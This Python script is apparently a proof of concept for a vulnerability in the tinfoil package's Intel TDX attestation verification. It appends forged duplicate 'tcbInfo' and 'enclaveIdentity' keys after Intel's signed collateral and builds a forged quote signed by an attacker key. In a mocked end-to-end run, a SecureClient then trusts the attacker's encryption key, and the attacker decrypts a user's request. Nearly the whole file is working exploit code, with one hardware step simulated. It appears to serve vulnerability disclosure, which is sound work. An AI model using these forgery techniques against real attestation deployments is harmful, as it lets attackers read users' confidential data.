"""
Independent verification (code-trace lens) of candidate L5 against the PyPI
release tinfoil==0.14.0 (installed from the published wheel, not a checkout).

Inputs (all genuine, verbatim from github.com/google/go-tdx-guest@v0.3.1
testing/testdata, fetched via the Go module proxy):
  quote.dat               real production TDX QuoteV4 (Sapphire Rapids, FMSPC 50806f000000)
  tcb_info.json           Intel-signed TCB Info v3 for that FMSPC
  qe_identity.json        Intel-signed TD_QE identity v2
  pckcrl.der/rootcrl.der  Intel-signed CRLs
  *IssuerChain.txt        URL-encoded PCS issuer-chain headers (go-tdx-guest test_cases.go)

Environment knobs (nothing in tinfoil's verification logic is patched):
  * clock frozen to 2023-06-30 (inside the captured collateral's validity window)
  * requests.get replaced by a stub playing tdx-proxy.tinfoil.sh (the attacker)
  * collateral cache dir pointed at a fresh temp dir per run
Scenario 2/3 additionally simulates ONE hardware step (see simulated_pce()).
"""
import base64
import copy
import datetime as _dt
import gzip
import hashlib
import json
import os
import struct
import sys
import tempfile
import types
from unittest import mock

import httpx
import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

import tinfoil
import tinfoil.attestation.attestation_tdx as at
import tinfoil.attestation.cert_utils as cu
import tinfoil.attestation.collateral_tdx as ct
import tinfoil.attestation.verify_tdx as vt
import tinfoil.client as tc
from tinfoil.attestation.attestation import Document
from tinfoil.attestation.types import HardwareMeasurement, Measurement, PredicateType
from tinfoil.attestation.validate_tdx import PolicyOptions

print("tinfoil package:", tinfoil.__file__)

DATA = sys.argv[1]
FROZEN = _dt.datetime(2023, 6, 30, tzinfo=_dt.timezone.utc)


class FrozenDateTime(_dt.datetime):
    @classmethod
    def now(cls, tz=None):
        return FROZEN.astimezone(tz) if tz else FROZEN.replace(tzinfo=None)


cu.datetime = FrozenDateTime
ct.datetime = FrozenDateTime


def rd(name, mode="rb"):
    with open(os.path.join(DATA, name), mode) as f:
        return f.read()


QE_GENUINE = rd("qe_identity.json").rstrip()
TCB_GENUINE = rd("tcb_info.json").rstrip()
QE_CHAIN = rd("qeIdentityIssuerChain.txt", "r").strip()
TCB_CHAIN = rd("tcbInfoIssuerChain.txt", "r").strip()
PCKCRL_CHAIN = rd("pckCrlIssuerChain.txt", "r").strip()
# PCS serves the PCK CRL as PEM by default; re-encode the genuine DER CRL (signature unchanged).
PCKCRL_PEM = x509.load_der_x509_crl(rd("pckcrl.der")).public_bytes(serialization.Encoding.PEM)
ROOTCRL_DER = rd("rootcrl.der")
QUOTE = rd("quote.dat")


def append_dup(genuine: bytes, key: str, forged: dict) -> bytes:
    """Keep Intel's signed object first; append a second top-level `key` member."""
    g = genuine.rstrip()
    assert g.endswith(b"}")
    return g[:-1] + b',"' + key.encode() + b'":' + json.dumps(forged, separators=(",", ":")).encode() + b"}"


class Proxy:
    """Stands in for https://tdx-proxy.tinfoil.sh/<intel host>/<path> (attacker-controlled)."""

    def __init__(self, tcb_body, qe_body):
        self.tcb_body, self.qe_body, self.urls = tcb_body, qe_body, []

    def get(self, url, timeout=None, **kw):
        self.urls.append(url)
        r = requests.Response()
        r.status_code, r.url = 200, url
        if "/tdx/certification/v4/tcb?" in url:
            r._content = self.tcb_body
            r.headers["TCB-Info-Issuer-Chain"] = TCB_CHAIN
        elif "/tdx/certification/v4/qe/identity" in url:
            r._content = self.qe_body
            r.headers["SGX-Enclave-Identity-Issuer-Chain"] = QE_CHAIN
        elif "/sgx/certification/v4/pckcrl?ca=platform" in url:
            r._content = PCKCRL_PEM
            r.headers["SGX-PCK-CRL-Issuer-Chain"] = PCKCRL_CHAIN
        elif url.endswith("/certificates.trustedservices.intel.com/IntelSGXRootCA.der"):
            r._content = ROOTCRL_DER
        else:
            raise AssertionError("unexpected URL " + url)
        return r


def doc_of(quote_bytes: bytes) -> str:
    return base64.b64encode(gzip.compress(quote_bytes)).decode()


def run(label, tcb_body, qe_body, fn):
    proxy = Proxy(tcb_body, qe_body)
    with tempfile.TemporaryDirectory() as cache, \
            mock.patch.object(ct, "_TDX_CACHE_DIR", cache), \
            mock.patch.object(ct.requests, "get", proxy.get):
        try:
            res = fn()
            print(f"  [ACCEPT] {label}")
            return res
        except (at.TdxAttestationError, ValueError) as e:
            print(f"  [REJECT] {label}\n           -> {type(e).__name__}: {e}")
            return None
        finally:
            hosts = sorted({u.split("/")[2] for u in proxy.urls})
            print(f"           collateral fetched from {hosts}: {[u.split('/', 3)[3].split('?')[0] for u in proxy.urls]}")


# ---------------------------------------------------------------------------
# Forged collateral objects (each is appended AFTER Intel's genuine signed one)
# ---------------------------------------------------------------------------
G_TCB = json.loads(TCB_GENUINE)["tcbInfo"]
G_QE = json.loads(QE_GENUINE)["enclaveIdentity"]
ZERO16 = [{"svn": 0} for _ in range(16)]


def forged_tcb(module_id: str, eval_num=None):
    f = copy.deepcopy(G_TCB)  # same id/version/fmspc/pceId/dates; only levels/modules change
    f["tcbLevels"] = [{"tcb": {"sgxtcbcomponents": ZERO16, "pcesvn": 0, "tdxtcbcomponents": ZERO16},
                       "tcbDate": "2023-06-14T00:00:00Z", "tcbStatus": "UpToDate"}]
    f["tdxModuleIdentities"] = [{"id": module_id, "mrsigner": "00" * 48, "attributes": "0000000000000000",
                                 "attributesMask": "FFFFFFFFFFFFFFFF",
                                 "tcbLevels": [{"tcb": {"isvsvn": 0}, "tcbDate": "2023-06-14T00:00:00Z",
                                                "tcbStatus": "UpToDate"}]}]
    if eval_num is not None:
        f["tcbEvaluationDataNumber"] = eval_num
        f["nextUpdate"] = "2099-01-01T00:00:00Z"
    return f


print("\n=== Facts about the genuine inputs ===")
print("genuine tcbInfo keys:", sorted(G_TCB.keys()))
print("genuine tcbLevels (status, sgx svns, pcesvn, tdx svns):")
for lvl in G_TCB["tcbLevels"]:
    t = lvl["tcb"]
    print("   ", lvl["tcbStatus"], [c["svn"] for c in t["sgxtcbcomponents"]], t["pcesvn"], [c["svn"] for c in t["tdxtcbcomponents"]])
from tinfoil.attestation.abi_tdx import parse_quote
from tinfoil.attestation.pck_extensions import extract_pck_extensions
_q = parse_quote(QUOTE)
_ext = extract_pck_extensions(vt.extract_pck_cert_chain(_q).pck_cert)
print("real quote: tee_tcb_svn", _q.td_quote_body.tee_tcb_svn.hex(), "| PCK cpusvn", _ext.tcb.cpu_svn.hex(), "pcesvn", _ext.tcb.pce_svn, "fmspc", _ext.fmspc)

# ===========================================================================
print("\n=== Scenario 1: real Intel-signed production quote, TCB Info duplicate key ===")
print("(policy step uses generic PolicyOptions() because this sample quote is not a Tinfoil TD;")
print(" fixed-bit checks still run. Collateral step is the unmodified validate_collateral.)")
DOC1 = doc_of(QUOTE)
cfg19 = at.TdxVerificationConfig(policy_options=PolicyOptions())
cfg15 = at.TdxVerificationConfig(policy_options=PolicyOptions(), min_tcb_evaluation_data_number=15)

run("1a genuine collateral, default min tcbEvaluationDataNumber=19",
    TCB_GENUINE, QE_GENUINE, lambda: at.verify_tdx_attestation(DOC1, config=cfg19))
run("1b genuine collateral, min=15 (emulates current genuine collateral passing freshness)",
    TCB_GENUINE, QE_GENUINE, lambda: at.verify_tdx_attestation(DOC1, config=cfg15))
TCB_DUP_1 = append_dup(TCB_GENUINE, "tcbInfo", forged_tcb("TDX_00"))
r = run("1c SAME as 1b but TCB Info = genuine signed tcbInfo + appended forged duplicate",
        TCB_DUP_1, QE_GENUINE, lambda: at.verify_tdx_attestation(DOC1, config=cfg15))
if r:
    print("           matched tcb_status:", r.tcb_level.tcb_status.value)
qe_eval_only = copy.deepcopy(G_QE)
qe_eval_only.update(tcbEvaluationDataNumber=99, nextUpdate="2099-01-01T00:00:00Z")  # Intel MRSIGNER kept
r = run("1d default min=19, both bodies dup-forged (only eval number/nextUpdate/levels changed)",
        append_dup(TCB_GENUINE, "tcbInfo", forged_tcb("TDX_00", 99)), append_dup(QE_GENUINE, "enclaveIdentity", qe_eval_only),
        lambda: at.verify_tdx_attestation(DOC1, config=cfg19))
if r:
    print("           matched tcb_status:", r.tcb_level.tcb_status.value,
          "| TCB eval#", r.collateral.tcb_info.tcb_info.tcb_evaluation_data_number,
          "| QE eval#", r.collateral.qe_identity.enclave_identity.tcb_evaluation_data_number)

# ===========================================================================
print("\n=== Scenario 2: non-Intel 'QE' + duplicate-key QE Identity, DEFAULT production entry point ===")
# Attacker material
ak = ec.generate_private_key(ec.SECP256R1())
ak_raw = ak.public_key().public_bytes(serialization.Encoding.X962, serialization.PublicFormat.UncompressedPoint)[1:]
tls_key = ec.generate_private_key(ec.SECP384R1())
tls_fp = hashlib.sha256(tls_key.public_key().public_bytes(serialization.Encoding.DER,
                                                           serialization.PublicFormat.SubjectPublicKeyInfo)).digest()
from pyhpke import AEADId, CipherSuite, KDFId, KEMId
SUITE = CipherSuite.new(KEMId.DHKEM_X25519_HKDF_SHA256, KDFId.HKDF_SHA256, AEADId.AES256_GCM)
hpke_kp = SUITE.kem.derive_key_pair(os.urandom(32))
HPKE_SK, HPKE_PK = hpke_kp.private_key, hpke_kp.public_key.to_public_bytes()
ATTACKER_QE_MRSIGNER = b"\x41" * 32
# "Published" reference values the attacker simply copies into the TD body
MRTD, RTMR0, RTMR1, RTMR2 = (bytes([i]) * 48 for i in (0x11, 0x22, 0x33, 0x44))

q = bytearray(QUOTE)
B = 0x30


def put(off, b):
    q[off:off + len(b)] = b


put(B + 0x00, at.EXPECTED_MINIMUM_TEE_TCB_SVN)  # tee_tcb_svn 3.1.2 -> module "TDX_01"
put(B + 0x10, at.ACCEPTED_MR_SEAMS[0])
put(B + 0x40, b"\0" * 48)  # MRSIGNERSEAM
put(B + 0x70, b"\0" * 8)  # SEAMATTRIBUTES
put(B + 0x78, at.EXPECTED_TD_ATTRIBUTES)
put(B + 0x80, at.EXPECTED_XFAM)
put(B + 0x88, MRTD)
put(B + 0xB8, b"\0" * 144)  # MRCONFIGID, MROWNER, MROWNERCONFIG
put(B + 0x148, RTMR0 + RTMR1 + RTMR2 + b"\0" * 48)
put(B + 0x208, tls_fp + HPKE_PK)  # report_data = attacker TLS fp || attacker HPKE key
SD = 0x27C
put(SD + 0x40, ak_raw)  # attestation key (attacker's)
CD = SD + 0x80 + 6  # cert data type 6 payload
QE = CD
put(QE + 0x80, ATTACKER_QE_MRSIGNER)  # QE report MRSIGNER: NOT Intel's
auth_size = struct.unpack_from("<H", q, QE + 384 + 64)[0]
auth = bytes(q[QE + 384 + 64 + 2:QE + 384 + 64 + 2 + auth_size])
put(QE + 0x140, hashlib.sha256(ak_raw + auth).digest() + b"\0" * 32)  # binds attacker AK
r_, s_ = decode_dss_signature(ak.sign(bytes(q[0:0x278]), ec.ECDSA(hashes.SHA256())))
put(SD, r_.to_bytes(32, "big") + s_.to_bytes(32, "big"))  # quote signature by attacker AK
FORGED_QUOTE = bytes(q)
DOC2 = doc_of(FORGED_QUOTE)

SIMULATED = []
_real_qe_sig = vt.verify_qe_report_signature


def simulated_pce(quote, pck_cert):
    """HARDWARE SIMULATION (the only non-genuine step): on a real Intel host with SGX
    FLC, root can launch its own non-debug enclave with the PROVISIONKEY attribute and
    the genuine PCE signs that enclave's REPORT with the platform's PCK. We cannot
    produce a PCK signature without that hardware, so this step stands in for it.
    Everything else (PCK chain to Intel root, AK binding, quote signature) is real."""
    assert pck_cert.subject.rfc4514_string().endswith("CN=Intel SGX PCK Certificate")
    try:
        _real_qe_sig(quote, pck_cert)
        SIMULATED.append("real-sig-ok")
    except vt.TdxVerificationError:
        SIMULATED.append("simulated")


qe_forged = copy.deepcopy(G_QE)
qe_forged.update(mrsigner=ATTACKER_QE_MRSIGNER.hex().upper(), miscselectMask="00000000",
                 attributesMask="00000000000000000000000000000000",
                 tcbLevels=[{"tcb": {"isvsvn": 0}, "tcbDate": "2023-06-14T00:00:00Z", "tcbStatus": "UpToDate"}])
qe_forged_99 = dict(qe_forged, tcbEvaluationDataNumber=99, nextUpdate="2099-01-01T00:00:00Z")
TCB_DUP_2 = append_dup(TCB_GENUINE, "tcbInfo", forged_tcb("TDX_01", 99))
cfg_default_eval15 = at.TdxVerificationConfig(min_tcb_evaluation_data_number=15)  # default Tinfoil policy

with mock.patch.object(vt, "verify_qe_report_signature", simulated_pce):
    run("2a genuine Intel QE Identity (control), default Tinfoil policy, min=15",
        TCB_DUP_2, QE_GENUINE, lambda: at.verify_tdx_attestation(DOC2, config=cfg_default_eval15))
    run("2b SAME as 2a but QE Identity = genuine signed enclaveIdentity + appended forged duplicate",
        TCB_DUP_2, append_dup(QE_GENUINE, "enclaveIdentity", qe_forged),
        lambda: at.verify_tdx_attestation(DOC2, config=cfg_default_eval15))
    v = run("2c production entry point Document(TDX_GUEST_V2).verify() with NO config override",
            TCB_DUP_2, append_dup(QE_GENUINE, "enclaveIdentity", qe_forged_99),
            lambda: Document(format=PredicateType.TDX_GUEST_V2, body=DOC2).verify())
    if v:
        print("           Verification.public_key_fp == attacker TLS fp:", v.public_key_fp == tls_fp.hex())
        print("           Verification.hpke_public_key == attacker HPKE key:", v.hpke_public_key == HPKE_PK.hex())
print("  simulated PCE steps:", SIMULATED)

# ===========================================================================
print("\n=== Scenario 3: SecureClient default flow (ehbp) -> attacker decrypts the user's request body ===")
from ehbp.derive import derive_response_keys, encrypt_chunk, frame_chunk
from ehbp.protocol import EXPORT_LABEL, EXPORT_LENGTH, HPKE_REQUEST_INFO

STOLEN = []


def attacker_server(request: httpx.Request) -> httpx.Response:
    enc = bytes.fromhex(request.headers["Ehbp-Encapsulated-Key"])
    body = request.read()
    rc = SUITE.create_recipient_context(enc, HPKE_SK, info=HPKE_REQUEST_INFO)
    pt, off = b"", 0
    while off < len(body):
        n = struct.unpack_from(">I", body, off)[0]
        pt += rc.open(body[off + 4:off + 4 + n], b"")
        off += 4 + n
    STOLEN.append((str(request.url), pt))
    nonce = os.urandom(32)
    km = derive_response_keys(rc.export(EXPORT_LABEL, EXPORT_LENGTH), enc, nonce)
    return httpx.Response(200, headers={"Ehbp-Response-Nonce": nonce.hex(), "Content-Type": "application/json"},
                          content=frame_chunk(encrypt_chunk(km, 0, b'{"answer":"served by attacker"}')))


# Genuine public reference values (Sigstore/GitHub in production) -- not attacker controlled;
# the forged TD body above just copies them.
stubs = dict(
    fetch_attestation=lambda host: Document(format=PredicateType.TDX_GUEST_V2, body=DOC2),
    fetch_latest_hardware_measurements=lambda: [HardwareMeasurement(id="tdx-platform@sha256:x", mrtd=MRTD.hex(), rtmr0=RTMR0.hex())],
    fetch_latest_release=lambda repo: types.SimpleNamespace(digest="ab" * 32, tag="v9.9.9"),
    fetch_attestation_bundle=lambda repo, digest: b"{}",
    verify_attestation=lambda b, d, r, t: Measurement(type=PredicateType.SNP_TDX_MULTIPLATFORM_v1,
                                                      registers=["cd" * 48, RTMR1.hex(), RTMR2.hex()]),
)
proxy = Proxy(TCB_DUP_2, append_dup(QE_GENUINE, "enclaveIdentity", qe_forged_99))
with tempfile.TemporaryDirectory() as cache, \
        mock.patch.object(ct, "_TDX_CACHE_DIR", cache), \
        mock.patch.object(ct.requests, "get", proxy.get), \
        mock.patch.object(vt, "verify_qe_report_signature", simulated_pce), \
        mock.patch.multiple(tc, **stubs), \
        mock.patch.object(tc.httpx, "HTTPTransport", lambda *a, **k: httpx.MockTransport(attacker_server)):
    client = tc.SecureClient(enclave="inference.tinfoil.sh")  # all defaults: repo, transport='ehbp'
    http = client.make_secure_http_client()
    gt = client.ground_truth
    print("  SecureClient.verify() succeeded; ground truth hpke key == attacker key:", gt.hpke_public_key == HPKE_PK.hex())
    resp = http.post("https://inference.tinfoil.sh/v1/chat/completions",
                     content=b'{"messages":[{"role":"user","content":"my medical record: XYZ-123"}]}')
    print("  client received:", resp.status_code, resp.content)
    print("  attacker decrypted request body:", STOLEN)
    print("  verification document security_verified:", client.get_verification_document().security_verified)
